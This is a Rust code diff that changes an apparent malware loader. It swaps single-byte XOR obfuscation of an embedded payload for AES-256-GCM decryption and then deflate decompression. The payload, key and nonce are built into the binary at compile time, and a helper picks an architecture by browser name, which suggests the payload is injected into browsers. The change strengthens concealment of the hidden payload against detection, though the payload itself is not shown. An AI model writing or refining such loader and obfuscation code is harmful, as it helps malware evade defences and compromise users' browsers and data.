@@ -3,7 +3,8 @@ use flate2::read::DeflateDecoder;
 use std::io::Read;
 
 const OBFUSCATED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_obf.bin"));
-const KEY_BYTE: u8 = include_bytes!(concat!(env!("OUT_DIR"), "/payload_key.bin"))[0];
+const AES_KEY:   &[u8; 32] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_key.bin"));
+const AES_NONCE: &[u8; 12] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_nonce.bin"));
 
 #[derive(Clone, Copy, PartialEq, Debug)]
 #[allow(dead_code)]
@@ -17,25 +18,17 @@ fn browser_architecture(browser_name: &str) -> Architecture {
 }
 
 #[inline(never)]
-fn decode_xor_chunk(src: &[u8], key: u8, dst: &mut [u8]) {
-    let mut idx = 0usize;
-    let len = src.len();
-    while idx < len {
-        unsafe {
-            let b = *src.get_unchecked(idx);
-            *dst.get_unchecked_mut(idx) = b ^ key;
-        }
-        idx = idx.wrapping_add(1);
-    }
+fn decrypt_payload(enc: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
+    use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};
+    let cipher = Aes256Gcm::new_from_slice(key).unwrap();
+    let n = Nonce::from_slice(nonce);
+    cipher.decrypt(n, enc).unwrap_or_default()
 }
 
 #[inline(never)]
 fn get_payload(_arch: Architecture) -> Vec<u8> {
-    let obf = OBFUSCATED_PAYLOAD;
-    let k = KEY_BYTE;
-    let mut buf = vec![0u8; obf.len()];
-    decode_xor_chunk(obf, k, &mut buf);
-    let mut decoder = DeflateDecoder::new(&buf[..]);
+    let compressed = decrypt_payload(OBFUSCATED_PAYLOAD, AES_KEY, AES_NONCE);
+    let mut decoder = DeflateDecoder::new(&compressed[..]);
     let mut decompressed = Vec::new();
     decoder.read_to_end(&mut decompressed).expect("decompress payload");
     decompressed
